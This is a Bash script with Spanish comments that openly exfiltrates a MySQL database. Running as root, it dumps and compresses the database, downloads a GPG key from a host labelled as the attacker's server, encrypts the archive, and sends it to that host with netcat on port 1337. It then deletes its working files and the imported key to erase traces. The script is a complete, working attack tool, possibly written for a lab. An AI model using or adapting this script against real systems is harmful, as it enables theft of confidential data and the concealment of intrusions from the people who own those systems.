#!/bin/bash

# Author: baphx6
# Verificar si se ejecuta como root
if [[ $EUID -ne 0 ]]; then
   echo "Este script debe ejecutarse como root" 
   exit 1
fi

# Se crea el directorio donde se guarda el dump de la base de datos
mkdir -p /tmp/data-exfiltration

# Configuración de la base de datos MySQL
DB_NAME="sampledb"

# Ruta del archivo dump
DUMP_FILE="/tmp/data-exfiltration/"$DB_NAME"_"$(date +%Y%m%d_%H%M%S)".sql"

# Ruta del archivo comprimido
ZIP_FILE="/tmp/data-exfiltration/"$DB_NAME"_"$(date +%Y%m%d_%H%M%S)".tar.gz"

# Dirección del servidor atacante y URL de la clave pública
ATTACKER_SERVER="192.168.122.217"
ATTACKER_PORT=1337
PUBLIC_KEY_URL="http://$ATTACKER_SERVER/public-gpg-key.key"

# Realizar copia de seguridad de la base de datos
echo "-----------------------------"
echo "Dumpeando $DB_NAME ..."
mysqldump $DB_NAME > $DUMP_FILE 
echo "-----------------------------"
# mysqldump -u$DB_USER -p$DB_PASS $DB_NAME > $DUMP_FILE ### Usar si se tienen credenciales o si este script no se ejecuta como root

# Comprimir el archivo de copia de seguridad
echo "-----------------------------"
echo "Comprimiendo ..."
tar czf $ZIP_FILE $DUMP_FILE
echo "-----------------------------"

# Encriptar el archivo comprimido con la clave pública del servidor atacante
echo "-----------------------------"
echo "Descargando clave pública..."
gpg --fetch-keys $PUBLIC_KEY_URL
echo "-----------------------------"
echo "-----------------------------"
echo "Encriptando ..."
gpg --recipient baphx6@tutanota.com --encrypt $ZIP_FILE > $ZIP_FILE".gpg"
echo "-----------------------------"

# Enviar el archivo encriptado al servidor atacante
echo "-----------------------------"
echo "Exfiltrando ..."
cat $ZIP_FILE".gpg" | nc $ATTACKER_SERVER $ATTACKER_PORT -q 0
echo "-----------------------------"

# Borrado de huellas
echo "-----------------------------"
echo "Borrando huellas ..."
rm -rf /tmp/data-exfiltration
gpg --batch --yes --delete-key baphx6@tutanota.com
echo "-----------------------------"
echo "+++ Terminado +++"
